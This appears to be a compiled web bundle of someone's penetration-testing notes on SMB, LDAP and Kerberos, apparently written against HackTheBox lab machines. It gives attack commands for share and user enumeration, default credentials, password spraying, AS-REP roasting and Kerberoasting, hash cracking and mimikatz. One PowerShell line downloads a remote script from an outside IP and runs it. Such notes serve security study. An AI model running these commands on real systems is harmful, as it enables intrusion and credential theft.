"use strict";(self.webpackChunkthe_nest_new=self.webpackChunkthe_nest_new||[]).push([[560],{3905:function(e,t,n){n.d(t,{Zo:function(){return c},kt:function(){return d}});var a=n(7294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function o(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},s=Object.keys(e);for(a=0;a<s.length;a++)n=s[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(a=0;a<s.length;a++)n=s[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),p=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=p(e.components);return a.createElement(l.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},m=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,s=e.originalType,l=e.parentName,c=o(e,["components","mdxType","originalType","parentName"]),m=p(n),d=r,k=m["".concat(l,".").concat(d)]||m[d]||u[d]||s;return n?a.createElement(k,i(i({ref:t},c),{},{components:n})):a.createElement(k,i({ref:t},c))}));function d(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var s=n.length,i=new Array(s);i[0]=m;var o={};for(var l in t)hasOwnProperty.call(t,l)&&(o[l]=t[l]);o.originalType=e,o.mdxType="string"==typeof e?e:r,i[1]=o;for(var p=2;p<s;p++)i[p]=n[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}m.displayName="MDXCreateElement"},5458:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return o},contentTitle:function(){return l},metadata:function(){return p},toc:function(){return c},default:function(){return m}});var a=n(7462),r=n(3366),s=(n(7294),n(3905)),i=["components"],o={sidebar_position:4},l="SMB, LDAP, Kerberos",p={unversionedId:"cybersecurity/pentest-notes/foothold/smb",id:"cybersecurity/pentest-notes/foothold/smb",title:"SMB, LDAP, Kerberos",description:"SMB",source:"@site/docs/cybersecurity/pentest-notes/foothold/smb.md",sourceDirName:"cybersecurity/pentest-notes/foothold",slug:"/cybersecurity/pentest-notes/foothold/smb",permalink:"/the-nest/docs/cybersecurity/pentest-notes/foothold/smb",editUrl:"https://github.com/crystalwwj/the-nest/edit/main/docs/cybersecurity/pentest-notes/foothold/smb.md",tags:[],version:"current",sidebarPosition:4,frontMatter:{sidebar_position:4},sidebar:"tutorialSidebar",previous:{title:"Using common services",permalink:"/the-nest/docs/cybersecurity/pentest-notes/foothold/services"},next:{title:"Linux Privilege Escalation",permalink:"/the-nest/docs/cybersecurity/pentest-notes/privilege-escalation/linux"}},c=[{value:"SMB",id:"smb",children:[{value:"SMBv1 vs SMBv2 vs SMBv3",id:"smbv1-vs-smbv2-vs-smbv3",children:[],level:3},{value:"Enumeration automated",id:"enumeration-automated",children:[],level:3},{value:"Manual Enumeration",id:"manual-enumeration",children:[],level:3},{value:"Brute force credentials",id:"brute-force-credentials",children:[],level:3}],level:2},{value:"LDAP",id:"ldap",children:[],level:2},{value:"Kerberos",id:"kerberos",children:[],level:2}],u={toc:c};function m(e){var t=e.components,n=(0,r.Z)(e,i);return(0,s.kt)("wrapper",(0,a.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"smb-ldap-kerberos"},"SMB, LDAP, Kerberos"),(0,s.kt)("h2",{id:"smb"},"SMB"),(0,s.kt)("p",null,(0,s.kt)("strong",{parentName:"p"},"SMB")," stands for Server Message Blocks and can be thought of as an Internet file system. It can be used to share access to files, printers, ports, and other communication on a network."),(0,s.kt)("p",null,"SMB runs on port 445 and is often used in conjunction with port 139, which runs NetBIOS. Computers and applications on a LAN use NetBIOS to communicate and transmit data."),(0,s.kt)("p",null,"SMB shares are like different directories that different users / permissions / groups can access. "),(0,s.kt)("p",null,"The common shares are:"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"C$: access C drive"),(0,s.kt)("li",{parentName:"ul"},"ADMIN$: access Windows installation directory"),(0,s.kt)("li",{parentName:"ul"},"IPC$: special share to facilitate inter-process communication"),(0,s.kt)("li",{parentName:"ul"},"PRINT$: access printer information"),(0,s.kt)("li",{parentName:"ul"},"SYSVOL: shared dircetory on ",(0,s.kt)("strong",{parentName:"li"},"domain controller")," with a copy of the domain's public files, such as group policy objects and scripts"),(0,s.kt)("li",{parentName:"ul"},"NETLOGON: shared dircetory on ",(0,s.kt)("strong",{parentName:"li"},"domain controller")," with a copy of logon scripts and group policies that can be used by computers deployed within a domain")),(0,s.kt)("div",{className:"admonition admonition-tip alert alert--success"},(0,s.kt)("div",{parentName:"div",className:"admonition-heading"},(0,s.kt)("h5",{parentName:"div"},(0,s.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,s.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"12",height:"16",viewBox:"0 0 12 16"},(0,s.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"}))),"My tip")),(0,s.kt)("div",{parentName:"div",className:"admonition-content"},(0,s.kt)("p",{parentName:"div"},"We shouldn't be able to access any shares without creds, usually user creds can access C$ and admin creds can access ADMIN$. Sometimes anonymous (null session) is allowed to access IPC$, in that case we use rpcclient to do enumeration (see below)."))),(0,s.kt)("h3",{id:"smbv1-vs-smbv2-vs-smbv3"},"SMBv1 vs SMBv2 vs SMBv3"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"SMBv1: the older and original version of SMB. SMBv1 is insecure since it does not offer encryption and has been much exploited, ex: MS17-010 (EternalBlue)"),(0,s.kt)("li",{parentName:"ul"},"SMBv2 protocol was introduced in Windows Vista and Windows Server 2008. Improved performance and security (not vulnerable to the SMBv1 exploits) and offers pre-auth integrity. Still has several RCE exploits, ex: MS09-050"),(0,s.kt)("li",{parentName:"ul"},"SMBv3 protocol was introduced in Windows 8 and Windows Server 2012. Introduced end-to-end encryption.")),(0,s.kt)("table",null,(0,s.kt)("thead",{parentName:"table"},(0,s.kt)("tr",{parentName:"thead"},(0,s.kt)("th",{parentName:"tr",align:null},"Version"),(0,s.kt)("th",{parentName:"tr",align:null},"OS"))),(0,s.kt)("tbody",{parentName:"table"},(0,s.kt)("tr",{parentName:"tbody"},(0,s.kt)("td",{parentName:"tr",align:null},"SMB 1.0"),(0,s.kt)("td",{parentName:"tr",align:null},"Windows 2000, Windows XP, Win Server 2003 + R2")),(0,s.kt)("tr",{parentName:"tbody"},(0,s.kt)("td",{parentName:"tr",align:null},"SMB 2.0"),(0,s.kt)("td",{parentName:"tr",align:null},"Windows Vista (SP1 or later), Win Server 2008")),(0,s.kt)("tr",{parentName:"tbody"},(0,s.kt)("td",{parentName:"tr",align:null},"SMB 2.1"),(0,s.kt)("td",{parentName:"tr",align:null},"Windows 7, Win Server 2008 R2")),(0,s.kt)("tr",{parentName:"tbody"},(0,s.kt)("td",{parentName:"tr",align:null},"SMB 3.0"),(0,s.kt)("td",{parentName:"tr",align:null},"Windows 8, Win Server 2012")),(0,s.kt)("tr",{parentName:"tbody"},(0,s.kt)("td",{parentName:"tr",align:null},"SMB 3.02"),(0,s.kt)("td",{parentName:"tr",align:null},"Windows 8.1, Win Server 2012 R2")),(0,s.kt)("tr",{parentName:"tbody"},(0,s.kt)("td",{parentName:"tr",align:null},"SMB 3.1"),(0,s.kt)("td",{parentName:"tr",align:null},"Windows 10, Win Server 2016")))),(0,s.kt)("p",null,"you can check SMB version with Powershell: ",(0,s.kt)("inlineCode",{parentName:"p"},"Get-SmbConnection or gsmbc")),(0,s.kt)("p",null,(0,s.kt)("strong",{parentName:"p"},"By default SMBv1 is enabled in Win10 and Win Server 2016!")),(0,s.kt)("h3",{id:"enumeration-automated"},"Enumeration automated"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},'# nmap\nnmap --script vuln -p 139,445 <IP>\nnmap --script "safe or smb-enum-*" -p 445 <IP>\n\n# enum4linux\nenum4linux <IP>\n# or with creds\nenum4linux -a [-u "<username>" -p "<passwd>"] <IP>\n')),(0,s.kt)("div",{className:"admonition admonition-tip alert alert--success"},(0,s.kt)("div",{parentName:"div",className:"admonition-heading"},(0,s.kt)("h5",{parentName:"div"},(0,s.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,s.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"12",height:"16",viewBox:"0 0 12 16"},(0,s.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"}))),"My tip")),(0,s.kt)("div",{parentName:"div",className:"admonition-content"},(0,s.kt)("p",{parentName:"div"},"enum4linux usually works better when the target is a linux machine! some checks will fail when scanning windows."))),(0,s.kt)("h3",{id:"manual-enumeration"},"Manual Enumeration"),(0,s.kt)("p",null,(0,s.kt)("strong",{parentName:"p"},"SMBClient")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"# list folders \nsmbclient --no-pass -L //<IP> # Null/anonymous session\nsmbclient -U 'username[%passwd]' -L //<IP>  # with creds\n\n# connect to a share\nsmbclient --no-pass //<IP>/<Folder>         # no creds\nsmbclient -U 'username[%passwd]' [--pw-nt-hash] //<IP> # with creds\n# Note: If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash\nsmbclient --kerberos //ws01win10.domain.com/C$      # quth with kerberos\n\n# for windows, backslashes also work\nsmbclient -U '%' -N \\\\\\\\<IP>\\\\<SHARE> # null session \nsmbclient -U '<USER>' \\\\\\\\<IP>\\\\<SHARE> # authenticated session (you will be prompted for a password)\n\n# to get all files, first connect to a share, then in interactive shell:\nmask \"\"\nrecurse ON\nprompt OFF\nmget *\n# NOTE: this downloads to current folder, so mkdir if necessary \n# use recurse to also list dirs and files\n")),(0,s.kt)("p",null,(0,s.kt)("strong",{parentName:"p"},"rpcclient")," "),(0,s.kt)("p",null,"When you can access IPC$, you can use rpcclient to interact with RPC endpoints via named pipes!"),(0,s.kt)("p",null,"Useful commands:"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"Users",(0,s.kt)("ul",{parentName:"li"},(0,s.kt)("li",{parentName:"ul"},"List users: ",(0,s.kt)("inlineCode",{parentName:"li"},"querydispinfo")," and ",(0,s.kt)("inlineCode",{parentName:"li"},"enumdomusers")),(0,s.kt)("li",{parentName:"ul"},"Get user details: ",(0,s.kt)("inlineCode",{parentName:"li"},"queryuser <0xrid>")),(0,s.kt)("li",{parentName:"ul"},"Get user groups: ",(0,s.kt)("inlineCode",{parentName:"li"},"queryusergroups <0xrid>")),(0,s.kt)("li",{parentName:"ul"},"GET SID of a user: ",(0,s.kt)("inlineCode",{parentName:"li"},"lookupnames <username>")),(0,s.kt)("li",{parentName:"ul"},"Get users aliases: ",(0,s.kt)("inlineCode",{parentName:"li"},"queryuseraliases [builtin|domain] <sid>")))),(0,s.kt)("li",{parentName:"ul"},"Groups",(0,s.kt)("ul",{parentName:"li"},(0,s.kt)("li",{parentName:"ul"},"List groups: ",(0,s.kt)("inlineCode",{parentName:"li"},"enumdomgroups")),(0,s.kt)("li",{parentName:"ul"},"Get group details: ",(0,s.kt)("inlineCode",{parentName:"li"},"querygroup <0xrid>")),(0,s.kt)("li",{parentName:"ul"},"Get group members: ",(0,s.kt)("inlineCode",{parentName:"li"},"querygroupmem <0xrid>")))),(0,s.kt)("li",{parentName:"ul"},"Domains",(0,s.kt)("ul",{parentName:"li"},(0,s.kt)("li",{parentName:"ul"},"List domains: ",(0,s.kt)("inlineCode",{parentName:"li"},"enumdomains")),(0,s.kt)("li",{parentName:"ul"},"Get SID: ",(0,s.kt)("inlineCode",{parentName:"li"},"lsaquery")),(0,s.kt)("li",{parentName:"ul"},"Domain info: ",(0,s.kt)("inlineCode",{parentName:"li"},"querydominfo")))),(0,s.kt)("li",{parentName:"ul"},"SID",(0,s.kt)("ul",{parentName:"li"},(0,s.kt)("li",{parentName:"ul"},"Find SIDs by name: ",(0,s.kt)("inlineCode",{parentName:"li"},"lookupnames <username>")),(0,s.kt)("li",{parentName:"ul"},"Find more SIDs: ",(0,s.kt)("inlineCode",{parentName:"li"},"lsaenumsid")),(0,s.kt)("li",{parentName:"ul"},"RID cycling (check more SIDs): ",(0,s.kt)("inlineCode",{parentName:"li"},"lookupsids <sid>"))))),(0,s.kt)("p",null,"You can also connect with creds:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"rpcclient -U '' -N <IP>     # null session\nrpcclient -U 'username[%passwd]' -N <IP>     # with creds\nrpcclient -k ws01win10.domain.com   # kerberos\n")),(0,s.kt)("p",null,(0,s.kt)("strong",{parentName:"p"},"crackmapexec")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"# list shares\ncrackmapexec smb <IP> -u '' -p '' --shares # Null session\ncrackmapexec smb <IP> -u 'username' -p 'password' --shares # with creds\ncrackmapexec smb <IP> -u 'username' -H '<HASH>' --shares # with creds\n")),(0,s.kt)("p",null,"Read registry with creds using ",(0,s.kt)("inlineCode",{parentName:"p"},"reg.py")," from ",(0,s.kt)("strong",{parentName:"p"},"Impacket")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s\nsudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s\nsudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s\n")),(0,s.kt)("h3",{id:"brute-force-credentials"},"Brute force credentials"),(0,s.kt)("p",null,"common creds taken from ",(0,s.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/pentesting/pentesting-smb#ipcusd-share"},"Hacktricks - Pentesting SMB"),":"),(0,s.kt)("table",null,(0,s.kt)("thead",{parentName:"table"},(0,s.kt)("tr",{parentName:"thead"},(0,s.kt)("th",{parentName:"tr",align:null},"username"),(0,s.kt)("th",{parentName:"tr",align:null},"password"))),(0,s.kt)("tbody",{parentName:"table"},(0,s.kt)("tr",{parentName:"tbody"},(0,s.kt)("td",{parentName:"tr",align:null},"Administrator, admin"),(0,s.kt)("td",{parentName:"tr",align:null},"(blank), password, administrator, admin")),(0,s.kt)("tr",{parentName:"tbody"},(0,s.kt)("td",{parentName:"tr",align:null},"arcserve"),(0,s.kt)("td",{parentName:"tr",align:null},"arcserve, backup")),(0,s.kt)("tr",{parentName:"tbody"},(0,s.kt)("td",{parentName:"tr",align:null},"tivoli, tmersrvd"),(0,s.kt)("td",{parentName:"tr",align:null},"tivoli, tmersrvd, admin")),(0,s.kt)("tr",{parentName:"tbody"},(0,s.kt)("td",{parentName:"tr",align:null},"backupexec, backup"),(0,s.kt)("td",{parentName:"tr",align:null},"backupexec, backup, arcada")),(0,s.kt)("tr",{parentName:"tbody"},(0,s.kt)("td",{parentName:"tr",align:null},"test,lab,demo"),(0,s.kt)("td",{parentName:"tr",align:null},"password,test,lab,demo")))),(0,s.kt)("p",null,(0,s.kt)("strong",{parentName:"p"},"crackmapexec")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"# password spraying\ncrackmapexec smb 10.10.10.172 -u users.txt -p users.txt --continue-on-success\n\n# rid-brute users\ncrackmapexec smb 10.1.1.68 -u 'a' -p '' --rid-brute\n")),(0,s.kt)("h2",{id:"ldap"},"LDAP"),(0,s.kt)("blockquote",null,(0,s.kt)("p",{parentName:"blockquote"},(0,s.kt)("strong",{parentName:"p"},"LDAP")," (Lightweight Directory Access Protocol) is a software protocol for enabling anyone to locate organizations, individuals, and other resources such as files and devices in a network, whether on the public Internet or on a corporate intranet. It usually runs on 389, 3268, 3269.")),(0,s.kt)("p",null,"Think of it as a tree structure for the entire organization."),(0,s.kt)("p",null,"Enumeration with ",(0,s.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/pentesting/pentesting-ldap#basic-enumeration"},"python")," or with ldapsearch:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"# without creds\nldapsearch -x -h <IP> -D '' -w '' -b \"DC=<1_SUBDOMAIN>,DC=<TLD>\"\n\n# with creds\nldapsearch -x -h <IP> -D '<DOMAIN>\\<username>' -w '<password>' -b \"DC=<1_SUBDOMAIN>,DC=<TLD>\"\n\n# with creds, kerberos instead of NTLM\nldapsearch -x -h <IP> -D '<DOMAIN>\\<username>' -w '<password>' -Y GSSAPI -b \"DC=<1_SUBDOMAIN>,DC=<TLD>\"\n\n")),(0,s.kt)("p",null,"When you have creds, you can try to dump data, change ",(0,s.kt)("inlineCode",{parentName:"p"},"CN")," for different info:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"# Commonly used CN values\n# CN=Users              -> extract users\n# CN=Computers          -> extract computers\n# CN=<MY NAME>          -> extract my info\n# CN=Domain Admins      -> extract domain admins\n# CN=Domain Users       -> extract domain users\n# CN=Enterprise Admins  -> extract enterprise admins\n# CN=Administrators     -> extract Administrators\n# CN=Remote Desktop Users   -> extract RDP users\n\nldapsearch -x -h <IP> -D '<DOMAIN>\\<username>' -w '<password>' -b \"CN=<CN>,DC=<1_SUBDOMAIN>,DC=<TLD>\"\n")),(0,s.kt)("p",null,"Dump everything"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"ldapsearch -x -h <IP> -D '<DOMAIN>\\<username>' -w '<password>' -b \"DC=<1_SUBDOMAIN>,DC=<TLD>\"\n# -x Simple Authentication\n# -h LDAP Server\n# -D My User\n# -w My password\n# -b Base site, all data from here will be given\n")),(0,s.kt)("h2",{id:"kerberos"},"Kerberos"),(0,s.kt)("p",null,"Kerberos is an authentication protocol running on port 88."),(0,s.kt)("p",null,"Refer to:"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("a",{parentName:"li",href:"https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a"},"cheatsheet")," for attacking kerberos"),(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("a",{parentName:"li",href:"https://www.tarlogic.com/en/blog/how-to-attack-kerberos/"},"tutorial")," for attacks")),(0,s.kt)("p",null,"Brute usernames with ",(0,s.kt)("inlineCode",{parentName:"p"},"kerbrute"),":"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"./kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175\n")),(0,s.kt)("p",null,"Example flow of ",(0,s.kt)("strong",{parentName:"p"},"ASREPRoasting")," (no creds):"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"# for asreproasting\nGetNPUsers.py -dc-ip 10.10.10.161 -usersfile users.txt -format hashcat -outputfile hashes.asreproast htb/\n\n# ticket in hashcat format, crack hashcat\nhashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force\n")),(0,s.kt)("p",null,"Example flow of ",(0,s.kt)("strong",{parentName:"p"},"Kerberoasting")," (with creds):"),(0,s.kt)("p",null,(0,s.kt)("strong",{parentName:"p"},"Remote")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"# for kerberoasting, use python 2.7.18 \nGetUserSPNs.py <domain>/<username>:<passwd> -outputfile ticket\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\nServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation \n--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------\nactive/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783 \n\n# ticket in john format, crack with john\nsudo john ticket --wordlist=/usr/share/wordlists/rockyou.txt\n\n# connect with smb or psexec\nsmbclient //10.10.10.100/Users -U Administrator\npsexec.py Administrator@active.htb\n")),(0,s.kt)("p",null,(0,s.kt)("strong",{parentName:"p"},"Local")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-powershell"},'# with mimikatz\n.\\mimikatz "privilege::debug" "kerberos::list /export" exit\n\n# with empire\npowershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString(\'http://192.168.119.211:8080/Invoke-Kerberoast.ps1\') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"\n\n# crack with hashcat or john\nhashcat -m 13100 kerb-Hash0.txt /opt/wordlist/rockyou.txt --force\n')))}m.isMDXComponent=!0}}]);